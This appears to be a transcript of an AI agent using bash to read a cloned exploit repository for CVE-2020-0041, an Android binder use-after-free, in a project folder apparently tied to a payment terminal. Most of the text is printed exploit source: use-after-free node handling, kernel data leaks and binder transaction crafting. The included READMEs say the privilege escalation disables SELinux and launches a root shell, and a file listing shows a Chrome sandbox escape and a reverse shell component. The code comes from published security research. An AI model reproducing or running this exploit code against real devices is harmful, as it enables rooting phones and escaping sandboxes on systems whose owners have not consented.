	bio_put_uint32(&msg, (uint32_t)((uint64_t)(th)>>32));
	binder_call(bs, &msg, &reply, handle, TERMINATE_PENDING_NODE);

	binder_free_buffer(bs, reply.data0);
}

/*
 * Leak the 2 qword of data from the UAFed pending node.
 * It has the side effect or terminating the pending_node_thread
 */
void pending_node_leak(pthread_t th, uint64_t *q1, uint64_t *q2)
{
	struct pending_node *node = pending_node_get(th);
	if (!node)
		return;
	/* Okay spray epoll structures. */
   pthread_barrier_wait(&node->ready);
   pthread_barrier_wait(&node->do_barrier);
   pthread_barrier_wait(&node->done_barrier);
	/* Inspecting node value. */

	if (q1)
		*q1 = node->leaked_data[0];
	if (q2)
		*q2 = node->leaked_data[1];
}


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/bfs_ref/lpe && sed -n 1,180p src/endpoint.c | grep -vE \"^\\s*$\" | head -130"}

[tool • bash]
#include <sched.h>
#include <stdio.h>
#include <pthread.h>
#include <stdint.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <poll.h>
#include <sys/epoll.h>
#include <errno.h>
#include <setjmp.h>
#include "binder.h"
#include "handle.h"
#include "log.h"
#include "endpoint.h"
#include "pending_node.h"
static struct endpoint_handle *endpoints = NULL;
static int endpoint_transaction_handler(struct endpoint_handle *handle, struct binder_transaction_data *tr, struct binder_io *msg, struct binder_io *reply)
{
	int res = 1;
	struct binder_state *bs = handle->bs;
	pthread_t th;
	switch (tr->code) {
		case GET_VMA_START:
			/* Do it in 2 times. */
			bio_put_uint32(reply, (uint32_t)bs->mapped);
			bio_put_uint32(reply, (uint32_t)(((uint64_t)(bs->mapped)>>32)));
			res = 0;
			break;
		case EXCHANGE_HANDLES:
			handle->client_handle = bio_get_ref(msg);
			/* Acquire the handle. */
			binder_acquire(bs, handle->client_handle);
			/* Create the vulnerable node in the process. */
			bio_put_obj(reply, bs->mapped + 0xe8);
			uint64_t node2 = bs->mapped + 0xe8;
			node2 = node2 & 0xFFFFFFFF;
			node2 = node2 << 32;
			node2 += 0x42;
			bio_put_obj(reply, node2);
			res = 0;
			break;
		case ADD_PENDING_NODE:
			add_pending_node(bs, handle->client_handle);
			//uaf_node_th = add_pending_node(bs, client_handle);
			//log_info("uaf_node_th: %p\n", uaf_node_th);
			res = 0;
			break;
		case TERMINATE_PENDING_NODE:
			th = bio_get_uint32(msg) + (((uint64_t)bio_get_uint32(msg)) << 32);
			terminate_pending_node(th);
			res = 0;
			break;
		case RESERVE_BUFFER:
			if (handle->reserved_buffer) {
				log_err("A buffer is already reserved. Free it if you want to reserve another one.\n");
				res = -1;
				break;
			}
			else {
				handle->reserved_buffer = tr->data.ptr.buffer;
				res = 42; /* Instruct the calling function to skip freeing the buffer. */
			}
			break;
		case FREE_RESERVED_BUFFER:
			if (handle->reserved_buffer) {
				binder_free_buffer(bs, handle->reserved_buffer);
				handle->reserved_buffer = 0;
			}
			res = 0;
			break;
		case TRIGGER_DECREF:
			res = 0;
			break;
		default:
			log_err("[-] Unknown transaction code.\n");
			break;
	}
	return res;
}
static struct endpoint_handle *_lookup_by_name(const char *name)
{
	struct endpoint_handle *handle = endpoints;
	while (handle) {
		if (!strcmp(name, handle->name))
				return handle;
		handle = handle->next;
	}
	return NULL;
}
static struct endpoint_handle *_lookup_by_pid(pid_t pid)
{
	struct endpoint_handle *handle = endpoints;
	while (handle) {
		if (handle->pid == pid)
			return handle;
		handle = handle->next;
	}
	return NULL;
}
void plop(void)
{
	struct endpoint_handle *handle = NULL;
	/* Setup jmpbufs. */
	handle = _lookup_by_pid(syscall(__NR_gettid));
	/* Close binder to release the UAFed pending node.
	 * This is the only way to actually free them without entered
	 * the binder_transaction_buffer_release() function.
	 */
	binder_close(handle->bs);
	handle->status = 0;
	/* longjmp. */
	longjmp(handle->env, 0);
}
/*
 * The binder endpoint thread. 
 */
static void *endpoint_thread(void *args)
{
	uint8_t data[128];
	uint32_t remaining = 0;
	uint32_t consumed = 0;
	struct endpoint_handle *handle = (struct endpoint_handle *)args;
	setjmp(handle->env);
	signal(SIGTERM, plop);
	handle->bs = binder_open(BINDER_DEVICE, 128 * 1024);
	if (!handle->bs) {
		log_err("[-] Failed to open binder device.\n");
		goto error;
	}


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/bfs_ref/lpe && sed -n 180,343p src/endpoint.c | grep -vE \"^\\s*$\""}

[tool • bash]
	while ((cmd = binder_read_next(handle->bs, data, &remaining, &consumed))) {
		switch (cmd) {
			case BR_DECREFS:
				break;
			case BR_TRANSACTION: {
				uint8_t rdata[256];
				struct binder_io msg;
				struct binder_io reply;
				int res;
				tr = (struct binder_transaction_data *)(data + consumed - sizeof(*tr));
				bio_init(&reply, rdata, sizeof(rdata), 4);
				bio_init_from_txn(&msg, tr);
				res = endpoint_transaction_handler(handle, tr, &msg, &reply);
				if (tr->flags & TF_ONE_WAY) {
					if (res == 42)
						continue;
					binder_free_buffer(handle->bs, tr->data.ptr.buffer);
				} else {
					if (res == 42)
						/* we reply, but skip freing the buffer. */
						binder_send_reply(handle->bs, &reply, NULL, 0);
					else
						binder_send_reply(handle->bs, &reply, tr->data.ptr.buffer, 0);
				}	
				break;
		        }
			default:
				break;
		}
	}
	exit(0);
error:
	handle->status = -1;
	pthread_barrier_wait(&handle->barrier);
	exit(0);
}
void endpoint_reset(const char *endpoint_name)
{
	struct endpoint_handle *handle = NULL;
	/* Double check that the name doesn't already exists. */
	if ((handle = _lookup_by_name(endpoint_name)) == NULL) {
		log_err("[-] An endpoint already exists with that name\n");
		return;
	}
   /* Reset the endpoint. */
	kill(handle->pid, SIGTERM);
	/* Wait on barrier. */
	pthread_barrier_wait(&handle->barrier);
}
static void endpoint_handle_free(struct endpoint_handle *handle)
{
	struct endpoint_handle *tmp = endpoints;
	/* Start by removing from linked list. */
	if (handle == endpoints) {
		endpoints = handle->next;
	} else {
		while (tmp->next != handle)
			tmp = tmp->next;
		/* Remove */
		tmp->next = handle->next;
	}
	free(handle->name);
	free(handle->stack);
	binder_close(handle->bs);
	free(handle);
}
/*
 * Bootstrap the binder endpoint.
 */
bool bootstrap_endpoint(const char *endpoint_name)
{
	struct endpoint_handle *handle = NULL;
	/* Double check that the name doesn't already exists. */
	if (_lookup_by_name(endpoint_name) != NULL) {
		log_err("[-] An endpoint already exists with that name\n");
		return false;
	}
	/* Allocate handle. */
	handle = malloc(sizeof(*handle));
	if (handle == -1) {
		log_err("[-] Unable to allocate endpoint handle. Reason: '%s'\n", strerror(errno));
		return false;
	}
	memset(handle, 0, sizeof(*handle));
	if (pthread_barrier_init(&handle->barrier, NULL, 2)) {
		perror("pthread_barrier_init");
		return false;
	}
	handle->next = NULL;
	handle->stack = malloc(65536);
	handle->name = strdup(endpoint_name);
	handle->status = 0;
	handle->pid = clone(endpoint_thread, handle->stack + 65536, CLONE_VM|SIGCHLD, handle);
	/* Wait on the barrier for the endpoint creation to be complete. */
	pthread_barrier_wait(&handle->barrier);
	if (handle->status < 0) {
		int status;
		waitpid(handle->pid, &status, NULL);
		endpoint_handle_free(handle);
		return false;
	}
	/* Insert the endpoint in the linked list. */
	if (!endpoints)
		endpoints = handle;
	else {
		struct endpoint_handle *tmp = endpoints;
		while (tmp->next != NULL)
			tmp = tmp->next;
		/* Insert. */
		tmp->next = handle;
	}
	return true;
}
bool terminate_endpoint(const char *endpoint_name)
{
	struct endpoint_handle *handle = _lookup_by_name(endpoint_name);
	int status;
	if (!handle) {
		log_err("[-] No endpoint named: '%s'\n", endpoint_name);
		exit(1);
		return false;
	}
	kill(handle->pid, SIGKILL);
	waitpid(handle->pid, &status, 0);
	endpoint_handle_free(handle);
	return true;
}
struct endpoint_handle *get_endpoints()
{
   return endpoints;
}


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/bfs_ref && ls -R | head -30; echo ===; cat lpe/README* 2>/dev/null | head -40; grep -n \"make_transaction\" lpe/src/binder.c | head"}

[tool • bash]
.:
lpe
README.md
sandbox

./lpe:
Android.mk
Application.mk
include
Makefile
README.md
src

./lpe/include:
binder.h
binder_lookup.h
endpoint.h
exploit.h
handle.h
helpers.h
log.h
node.h
pending_node.h
realloc.h
uapi_binder.h

./lpe/src:
binder.c
binder_lookup.c
endpoint.c
===
# CVE-2020-0041: privilege escalation exploit

This folder contains the local privilege escalation exploit we wrote for CVE-2020-0041. 
The exploit is provided with hardcoded offsets for a Pixel 3 device running the February 
2020 firmware (QQ1A.200205.002). The exploit needs to be adapted before being able to 
run it on other vulnerable devices or Pixel 3 devices with different firmware versions.

The exploit disables SELinux and then launches a root shell.

## Testing the exploit

The exploit can be built by simply running "make" with the Android NDK in the path. It can also 
be pushed to a phone attached with adb by doing "make all push" (warnings removed for brevity):

```
user@laptop:~/CVE-2020-0041/lpe$ make all push
Building Android
NDK_PROJECT_PATH=. ndk-build NDK_APPLICATION_MK=./Application.mk
make[1]: Entering directory `/home/user/CVE-2020-0041/lpe'
[arm64-v8a] Compile        : poc <= exploit.c
[arm64-v8a] Compile        : poc <= endpoint.c
[arm64-v8a] Compile        : poc <= pending_node.c
[arm64-v8a] Compile        : poc <= binder.c
[arm64-v8a] Compile        : poc <= log.c
[arm64-v8a] Compile        : poc <= helpers.c
[arm64-v8a] Compile        : poc <= binder_lookup.c
[arm64-v8a] Compile        : poc <= realloc.c
[arm64-v8a] Compile        : poc <= node.c
[arm64-v8a] Executable     : poc
[arm64-v8a] Install        : poc => libs/arm64-v8a/poc
make[1]: Leaving directory `/home/user/CVE-2020-0041/lpe'
adb push libs/arm64-v8a/poc /data/local/tmp/poc
libs/arm64-v8a/poc: 1 file pushed. 4.3 MB/s (39016 bytes in 0.009s)
```

Now just run /data/local/tmp/poc from an adb shell to see the exploit running:

```
blueline:/ $ /data/local/tmp/poc
[+] Mapped 200000
986:void *make_transaction(void *buffer, bool one_way, uint32_t handle, void *opaque, size_t opaque_size, void *offsets, size_t offsets_size)
1034:	make_transaction(buffer, one_way, handle, opaque, opaque_size, offsets, offsets_size);
1068:	make_transaction(buffer, false, handle, opaque, opaque_size, offsets, offsets_size);


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/bfs_ref && cat README.md; echo \"=== lpe/src/binder.c key parts ===\"; sed -n 850,1000p lpe/src/binder.c"}

[tool • bash]
# CVE-2020-0041

This repository contains code for exploiting CVE-2020-0041, a bug we reported to Google in Decmeber 2019 and was fixed in the Android Security Bulletin from March 2020.

You can find the sandbox escape exploit in [sandbox/](sandbox/). The analysis of the bug and exploitation approach can be found at https://labs.bluefrostsecurity.de/blog/2020/03/31/cve-2020-0041-part-1-sandbox-escape/ .

Similarly, you can find the privilege escalation exploit in [lpe/](lpe/). The exploitation approach for this part can be found at https://labs.bluefrostsecurity.de/blog/2020/04/08/cve-2020-0041-part-2-escalating-to-root/ .
=== lpe/src/binder.c key parts ===

    if (len >= (MAX_BIO_SIZE / sizeof(uint16_t))) {
        bio_put_uint32(bio, 0xffffffff);
        return;
    }

    /* Note: The payload will carry 32bit size instead of size_t */
    bio_put_uint32(bio, (uint32_t) len);
    len = (len + 1) * sizeof(uint16_t);
    ptr = bio_alloc(bio, len);
    if (ptr)
        memcpy(ptr, str, len);
}

void bio_put_string16_x(struct binder_io *bio, const char *_str)
{
    unsigned char *str = (unsigned char*) _str;
    size_t len;
    uint16_t *ptr;

    if (!str) {
        bio_put_uint32(bio, 0xffffffff);
        return;
    }

    len = strlen(_str);

    if (len >= (MAX_BIO_SIZE / sizeof(uint16_t))) {
        bio_put_uint32(bio, 0xffffffff);
        return;
    }

    /* Note: The payload will carry 32bit size instead of size_t */
    bio_put_uint32(bio, len);
    ptr = bio_alloc(bio, (len + 1) * sizeof(uint16_t));
    if (!ptr)
        return;

    while (*str)
        *ptr++ = *str++;
    *ptr++ = 0;
}

static void *bio_get(struct binder_io *bio, size_t size)
{
    size = (size + 3) & (~3);

    if (bio->data_avail < size){
        bio->data_avail = 0;
        bio->flags |= BIO_F_OVERFLOW;
        return NULL;
    }  else {
        void *ptr = bio->data;
        bio->data += size;
        bio->data_avail -= size;
        return ptr;
    }
}

uint32_t bio_get_uint32(struct binder_io *bio)
{
    uint32_t *ptr = bio_get(bio, sizeof(*ptr));
    return ptr ? *ptr : 0;
}

uint16_t *bio_get_string16(struct binder_io *bio, size_t *sz)
{
    size_t len;

    /* Note: The payload will carry 32bit size instead of size_t */
    len = (size_t) bio_get_uint32(bio);
    if (sz)
        *sz = len;
    return bio_get(bio, (len + 1) * sizeof(uint16_t));
}

static struct flat_binder_object *_bio_get_obj(struct binder_io *bio)
{
    size_t n;
    size_t off = bio->data - bio->data0;

    /* TODO: be smarter about this? */
    for (n = 0; n < bio->offs_avail; n++) {
        if (bio->offs[n] == off)
            return bio_get(bio, sizeof(struct flat_binder_object));
    }

    bio->data_avail = 0;
    bio->flags |= BIO_F_OVERFLOW;
    return NULL;
}

uint32_t bio_get_ref(struct binder_io *bio)
{
    struct flat_binder_object *obj;

    obj = _bio_get_obj(bio);
//    log_info("[*] Ref object at %p\n", obj);
    
    if (!obj)
        return 0;

    if (obj->hdr.type == BINDER_TYPE_HANDLE) {
        return obj->handle;
    }

    /* I added that for my tests, but I shouldn't be needed on Android. */
    if (obj->hdr.type == BINDER_TYPE_BINDER) {
	    return obj->handle;
    }

    return 0;
}

/* This is custom code added to the binder API, to aid in exploitation. */
int binder_read(int fd, void *buffer, size_t size)
{
	int res;
	struct binder_write_read bwr;

	bzero(&bwr, sizeof(bwr));

	bwr.read_buffer = buffer;
	bwr.read_size = size;

	res = ioctl(fd, BINDER_WRITE_READ, &bwr);

	if (res < 0) {
		log_err("binder_read() -> %s\n", strerror(errno));
		return res;
	}


	return bwr.read_consumed;
}

void *make_transaction(void *buffer, bool one_way, uint32_t handle, void *opaque, size_t opaque_size, void *offsets, size_t offsets_size)
{
	struct binder_transaction_data *tr;
	*(uint32_t *)buffer = BC_TRANSACTION;
	tr = (struct binder_transaction_data *)(buffer + sizeof(uint32_t));

	tr->target.handle = handle;
	//tr->flags = TF_ONE_WAY;
	tr->flags = one_way ? TF_ONE_WAY : 0;
	/* We do accept FDS. */
	tr->flags |= TF_ACCEPT_FDS;
	tr->data.ptr.buffer = opaque;
	tr->data_size = opaque_size;
	tr->data.ptr.offsets = offsets;
	tr->offsets_size = offsets_size;


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/bfs_ref && sed -n 1000,1130p lpe/src/binder.c; sed -n 1,120p lpe/src/binder.c"}

[tool • bash]
	tr->offsets_size = offsets_size;


	/* Return a pointer to the location for the next command. */
	return (void *)(tr + 1);
}

void *make_reply(void *buffer, bool one_way, uint32_t handle, void *opaque, size_t opaque_size, void *offsets, size_t offsets_size)
{
	struct binder_transaction_data *tr;
	*(uint32_t *)buffer = BC_REPLY;
	tr = (struct binder_transaction_data *)(buffer + sizeof(uint32_t));

	tr->target.handle = handle;
	//tr->flags = TF_ONE_WAY;
	tr->flags = one_way ? TF_ONE_WAY : 0;
	tr->data.ptr.buffer = opaque;
	tr->data_size = opaque_size;
	tr->data.ptr.offsets = offsets;
	tr->offsets_size = offsets_size;


	/* Return a pointer to the location for the next command. */
	return (void *)(tr + 1);
}


int binder_transaction(struct binder_state *bs, bool one_way, uint32_t handle, void *opaque, size_t opaque_size, void *offsets, size_t offsets_size)
{
	struct binder_transaction_data *tr;
	uint8_t buffer[sizeof(uint32_t) + sizeof(*tr)];
	uint32_t remaining = 0;
	uint32_t consumed = 0;

	make_transaction(buffer, one_way, handle, opaque, opaque_size, offsets, offsets_size);

	/* Sending the transaction. */
	int res = binder_write(bs, buffer, sizeof(buffer));
	if (res < 0)
		return res;
#if 0
	uint32_t r[32];
	int r2;
	r2 = binder_read(bs->fd, r, 32 * sizeof(uint32_t));
	/* TODO: Check results. */
	int i;
#endif


	return res;
}

int binder_reply(struct binder_state *bs, uint32_t handle, void *opaque, size_t opaque_size, void *offsets, size_t offsets_size)
{
	void *buffer;
	struct binder_transaction_data *tr;
	size_t size = sizeof(uint32_t) + sizeof(*tr);


	buffer = malloc(size);
	if (buffer == NULL) {
		log_err("[-] binder_transaction. Failed to allocate memory.\n");
		return -1;
	}

	bzero(buffer, size);


	make_transaction(buffer, false, handle, opaque, opaque_size, offsets, offsets_size);

	*(uint32_t *)(buffer) = BC_REPLY;

	/* Sending the transaction. */
	int res = binder_write(bs, buffer, size);
	/* TODO: Check result. */

	uint32_t r[32];
	int r2;
	r2 = binder_read(bs->fd, r, 32 * sizeof(uint32_t));
	/* TODO: Check results. */
	int i;

	free(buffer);

	return res;
}

uint32_t binder_read_next(struct binder_state *bs, void *data, uint32_t *remaining, uint32_t *consumed)
{
	int res;
	uint32_t cmd;
	void *ptr, *end;

//	log_info("remaining: %x\nconsumed: %x\n", *remaining, *consumed);

	if (!*remaining) {
		/* Read the first 8 bytes. */
//		log_info("before read\n");
		res = binder_read(bs->fd, data, 32 * sizeof(uint32_t));
//		log_info("after read: %x\n", res);
		if (res < 0) {
			log_err("binder_read_next: %s\n", strerror(errno));
			return (uint32_t)-1;
		}

		*remaining = res;
		*consumed = 0;
	}


	ptr = data;
	ptr += *consumed;
	end = ptr + *remaining;

	cmd = *(uint32_t *)ptr;

	*consumed += sizeof(uint32_t);
	*remaining -= sizeof(uint32_t);
	ptr += sizeof(uint32_t);

	//log_info("cmd: %s\n", cmd_name(cmd));
	switch (cmd) {
		case BR_NOOP:
			res = 0;
			break;

		case BR_RELEASE:
		case BR_DECREFS:
		case BR_ACQUIRE:
		case BR_INCREFS:
			res =2 * sizeof(uint64_t);
/* Copyright 2008 The Android Open Source Project
 */

#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

#include "log.h"
#include "binder.h"
#include "uapi_binder.h"

#define MAX_BIO_SIZE (1 << 30)

#define TRACE 0

void bio_init_from_txn(struct binder_io *io, struct binder_transaction_data *txn);

#if TRACE
void hexdump(void *_data, size_t len)
{
    unsigned char *data = _data;
    size_t count;

    for (count = 0; count < len; count++) {
        if ((count & 15) == 0)
            flog_info(stderr,"%04zu:", count);
        flog_info(stderr,"\\x%02x", *data);
        // flog_info(stderr," %02x %c", *data,
                // (*data < 32) || (*data > 126) ? '.' : *data);
        data++;
        if ((count & 15) == 15)
            flog_info(stderr,"\n");
    }
    if ((count & 15) != 0)
        flog_info(stderr,"\n");
}

void binder_dump_txn(struct binder_transaction_data *txn)
{
    struct flat_binder_object *obj;
    binder_size_t *offs = (binder_size_t *)(uintptr_t)txn->data.ptr.offsets;
    size_t count = txn->offsets_size / sizeof(binder_size_t);

    flog_info(stderr,"  target %016"PRIx64"  cookie %016"PRIx64"  code %08x  flags %08x\n",
            (uint64_t)txn->target.ptr, (uint64_t)txn->cookie, txn->code, txn->flags);
    flog_info(stderr,"  pid %8d  uid %8d  data %"PRIu64"  offs %"PRIu64"\n",
            txn->sender_pid, txn->sender_euid, (uint64_t)txn->data_size, (uint64_t)txn->offsets_size);
    hexdump((void *)(uintptr_t)txn->data.ptr.buffer, txn->data_size);
    while (count--) {
        obj = (struct flat_binder_object *) (((char*)(uintptr_t)txn->data.ptr.buffer) + *offs++);
        flog_info(stderr,"  - type %08x  flags %08x  ptr %016"PRIx64"  cookie %016"PRIx64"\n",
                obj->hdr.type, obj->flags, (uint64_t)obj->binder, (uint64_t)obj->cookie);
    }
}

#define NAME(n) case n: return #n
const char *cmd_name(uint32_t cmd)
{
    switch(cmd) {
        NAME(BR_NOOP);
        NAME(BR_TRANSACTION_COMPLETE);
        NAME(BR_INCREFS);
        NAME(BR_ACQUIRE);
        NAME(BR_RELEASE);
        NAME(BR_DECREFS);
        NAME(BR_TRANSACTION);
        NAME(BR_REPLY);
        NAME(BR_FAILED_REPLY);
        NAME(BR_DEAD_REPLY);
        NAME(BR_DEAD_BINDER);
    default: return "???";
    }
}
#else
#define hexdump(a,b) do{} while (0)
#define binder_dump_txn(txn)  do{} while (0)
#endif

#define NAME(n) case n: return #n
const char *cmd_name(uint32_t cmd)
{
    switch(cmd) {
        NAME(BR_NOOP);
        NAME(BR_TRANSACTION_COMPLETE);
        NAME(BR_INCREFS);
        NAME(BR_ACQUIRE);
        NAME(BR_RELEASE);
        NAME(BR_DECREFS);
        NAME(BR_TRANSACTION);
        NAME(BR_REPLY);
        NAME(BR_FAILED_REPLY);
        NAME(BR_DEAD_REPLY);
        NAME(BR_DEAD_BINDER);
    default: return "???";
    }
}


#define BIO_F_SHARED    0x01  /* needs to be buffer freed */
#define BIO_F_OVERFLOW  0x02  /* ran out of space */
#define BIO_F_IOERROR   0x04
#define BIO_F_MALLOCED  0x08  /* needs to be free()'d */

struct binder_state *binder_open(const char* driver, size_t mapsize)
{
    struct binder_state *bs;
    struct binder_version vers;

    bs = malloc(sizeof(*bs));
    if (!bs) {
        errno = ENOMEM;
        return NULL;
    }



[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/bfs_ref && grep -n \"bio_put_obj\\|bio_get_ref\\|FLAT_BINDER\" lpe/src/binder.c | head; sed -n '/void bio_put_obj/,/^}/p' lpe/src/binder.c; sed -n '/uint32_t bio_get_ref/,/^}/p' lpe/src/binder.c"}

[tool • bash]
678:void bio_put_obj(struct binder_io *bio, void *ptr)
686:    obj->flags = 0x7f | FLAT_BINDER_FLAG_ACCEPTS_FDS;
700:    obj->flags = 0x7f | FLAT_BINDER_FLAG_ACCEPTS_FDS;
829:    obj->flags = 0x7f | FLAT_BINDER_FLAG_ACCEPTS_FDS;
942:uint32_t bio_get_ref(struct binder_io *bio)
void bio_put_obj(struct binder_io *bio, void *ptr)
{
    struct flat_binder_object *obj;

    obj = bio_alloc_obj(bio);
    if (!obj)
        return;

    obj->flags = 0x7f | FLAT_BINDER_FLAG_ACCEPTS_FDS;
    obj->hdr.type = BINDER_TYPE_BINDER;
    obj->binder = (uintptr_t)ptr;
    obj->cookie = 0;
}
uint32_t bio_get_ref(struct binder_io *bio)
{
    struct flat_binder_object *obj;

    obj = _bio_get_obj(bio);
//    log_info("[*] Ref object at %p\n", obj);
    
    if (!obj)
        return 0;

    if (obj->hdr.type == BINDER_TYPE_HANDLE) {
        return obj->handle;
    }

    /* I added that for my tests, but I shouldn't be needed on Android. */
    if (obj->hdr.type == BINDER_TYPE_BINDER) {
	    return obj->handle;
    }

    return 0;
}


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/bfs_ref && cat sandbox/README* 2>/dev/null | head -10; ls sandbox/src; grep -n \"make_binder_transaction\\|smash\\|cookie\\|fake_object\" sandbox/src/exploit.c 2>/dev/null | head -40"}

[tool • bash]
# CVE-2020-0041: Chrome sandbox escape exploit

This folder contains the Chrome sandbox escape exploit we wrote for CVE-2020-0041. 
The exploit is provided as a set of patches for Chromium 78.0.3904.62 in order to 
demonstrate the approach.

The same code could be simply injected into the renderer from an RCE vulnerability 
or using a rooted phone for test pruposes.   

## Testing the exploit
ls: cannot access 'sandbox/src': No such file or directory


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/bfs_ref && find sandbox -type f | head -30"}

[tool • bash]
sandbox/main.diff
sandbox/reverse_shell/Android.mk
sandbox/reverse_shell/src/reverse_shell.c
sandbox/reverse_shell/Application.mk
sandbox/reverse_shell/Makefile
sandbox/README.md
sandbox/serve.py
sandbox/v8.diff
sandbox/index.html


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/bfs_ref && cat sandbox/main.diff | head -200"}

[tool • bash]
diff --git a/content/renderer/binder.c b/content/renderer/binder.c
new file mode 100644
index 000000000000..91b6fa587b36
--- /dev/null
+++ b/content/renderer/binder.c
@@ -0,0 +1,1281 @@
+/* Copyright 2008 The Android Open Source Project
+ */
+
+#include <errno.h>
+#include <fcntl.h>
+#include <inttypes.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdbool.h>
+#include <string.h>
+#include <sys/mman.h>
+#include <unistd.h>
+
+// #include "log.h"
+#include "binder.h"
+#include "uapi_binder.h"
+
+#define MAX_BIO_SIZE (1 << 30)
+
+#define TRACE 0
+
+void bio_init_from_txn(struct binder_io *io, struct binder_transaction_data *txn);
+
+#define log_info(...) __android_log_print(ANDROID_LOG_DEBUG, "PWN", __VA_ARGS__)
+#define log_err(...) __android_log_print(ANDROID_LOG_DEBUG, "PWN", __VA_ARGS__)
+#define ALOGE(...) __android_log_print(ANDROID_LOG_DEBUG, "PWN", __VA_ARGS__)
+
+
+#if TRACE
+
+void hexdump(void *_data, size_t len)
+{
+    unsigned char *data = _data;
+    size_t count;
+
+    for (count = 0; count < len; count++) {
+        if ((count & 15) == 0)
+            log_info("%04zu:", count);
+        log_info("\\x%02x", *data);
+        // log_info(" %02x %c", *data,
+                // (*data < 32) || (*data > 126) ? '.' : *data);
+        data++;
+        if ((count & 15) == 15)
+            log_info("\n");
+    }
+    if ((count & 15) != 0)
+        log_info("\n");
+}
+
+
+void binder_dump_txn(struct binder_transaction_data *txn)
+{
+    struct flat_binder_object *obj;
+    binder_size_t *offs = (binder_size_t *)(uintptr_t)txn->data.ptr.offsets;
+    size_t count = txn->offsets_size / sizeof(binder_size_t);
+
+    flog_info(stderr,"  target %016"PRIx64"  cookie %016"PRIx64"  code %08x  flags %08x\n",
+            (uint64_t)txn->target.ptr, (uint64_t)txn->cookie, txn->code, txn->flags);
+    flog_info(stderr,"  pid %8d  uid %8d  data %"PRIu64"  offs %"PRIu64"\n",
+            txn->sender_pid, txn->sender_euid, (uint64_t)txn->data_size, (uint64_t)txn->offsets_size);
+    hexdump((void *)(uintptr_t)txn->data.ptr.buffer, txn->data_size);
+    while (count--) {
+        obj = (struct flat_binder_object *) (((char*)(uintptr_t)txn->data.ptr.buffer) + *offs++);
+        flog_info(stderr,"  - type %08x  flags %08x  ptr %016"PRIx64"  cookie %016"PRIx64"\n",
+                obj->hdr.type, obj->flags, (uint64_t)obj->binder, (uint64_t)obj->cookie);
+    }
+}
+
+#define NAME(n) case n: return #n
+const char *cmd_name(uint32_t cmd)
+{
+    switch(cmd) {
+        NAME(BR_NOOP);
+        NAME(BR_TRANSACTION_COMPLETE);
+        NAME(BR_INCREFS);
+        NAME(BR_ACQUIRE);
+        NAME(BR_RELEASE);
+        NAME(BR_DECREFS);
+        NAME(BR_TRANSACTION);
+        NAME(BR_REPLY);
+        NAME(BR_FAILED_REPLY);
+        NAME(BR_DEAD_REPLY);
+        NAME(BR_DEAD_BINDER);
+    default: return "???";
+    }
+}
+#else
+#define hexdump(a,b) do{} while (0)
+#define binder_dump_txn(txn)  do{} while (0)
+#endif
+
+#define NAME(n) case n: return #n
+const char *cmd_name(uint32_t cmd)
+{
+    switch(cmd) {
+        NAME(BR_NOOP);
+        NAME(BR_TRANSACTION_COMPLETE);
+        NAME(BR_INCREFS);
+        NAME(BR_ACQUIRE);
+        NAME(BR_RELEASE);
+        NAME(BR_DECREFS);
+        NAME(BR_TRANSACTION);
+        NAME(BR_REPLY);
+        NAME(BR_FAILED_REPLY);
+        NAME(BR_DEAD_REPLY);
+        NAME(BR_DEAD_BINDER);
+    default: return "???";
+    }
+}
+
+
+#define BIO_F_SHARED    0x01  /* needs to be buffer freed */
+#define BIO_F_OVERFLOW  0x02  /* ran out of space */
+#define BIO_F_IOERROR   0x04
+#define BIO_F_MALLOCED  0x08  /* needs to be free()'d */
+
+struct binder_state *binder_open(const char* driver, size_t mapsize)
+{
+    struct binder_state *bs;
+    struct binder_version vers;
+
+    bs = (struct binder_state *)malloc(sizeof(*bs));
+    if (!bs) {
+        errno = ENOMEM;
+        return NULL;
+    }
+
+    bs->fd = open(driver, O_RDWR | O_CLOEXEC);
+    if (bs->fd < 0) {
+        log_info("binder: cannot open %s (%s)\n",
+                driver, strerror(errno));
+        goto fail_open;
+    }
+
+    if ((ioctl(bs->fd, BINDER_VERSION, &vers) == -1) ||
+        (vers.protocol_version != BINDER_CURRENT_PROTOCOL_VERSION)) {
+        log_info(
+                "binder: kernel driver version (%d) differs from user space version (%d)\n",
+                vers.protocol_version, BINDER_CURRENT_PROTOCOL_VERSION);
+        goto fail_open;
+    }
+
+    bs->mapsize = mapsize;
+    bs->mapped = mmap(NULL, mapsize, PROT_READ, MAP_PRIVATE, bs->fd, 0);
+    if (bs->mapped == MAP_FAILED) {
+        log_info("binder: cannot map device (%s)\n",
+                strerror(errno));
+        goto fail_map;
+    }
+
+    return bs;
+
+fail_map:
+    close(bs->fd);
+fail_open:
+    free(bs);
+    return NULL;
+}
+
+void binder_close(struct binder_state *bs)
+{
+    munmap(bs->mapped, bs->mapsize);
+    close(bs->fd);
+    free(bs);
+}
+
+int binder_become_context_manager(struct binder_state *bs)
+{
+    return ioctl(bs->fd, BINDER_SET_CONTEXT_MGR, 0);
+}
+
+int binder_write(struct binder_state *bs, void *data, size_t len)
+{
+    struct binder_write_read bwr;
+    int res;
+
+    bwr.write_size = len;
+    bwr.write_consumed = 0;
+    bwr.write_buffer = (uintptr_t) data;
+    bwr.read_size = 0;
+    bwr.read_consumed = 0;
+    bwr.read_buffer = 0;
+    res = ioctl(bs->fd, BINDER_WRITE_READ, &bwr);
